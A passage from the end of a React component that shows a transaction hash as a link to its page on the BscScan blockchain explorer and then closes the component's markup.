            <div className="text-center text-sm text-gray-400 px-4">
              <p className="mb-2">Transaction Hash:</p>
              <a
                href={`https://bscscan.com/tx/${txHash}`}
                target="_blank"
                rel="noopener noreferrer"
                className="text-blue-400 hover:text-blue-300 break-all text-xs"
              >
                {txHash}
              </a>
            </div>
          )}
        </div>
      </main>
    </div>
  )
}
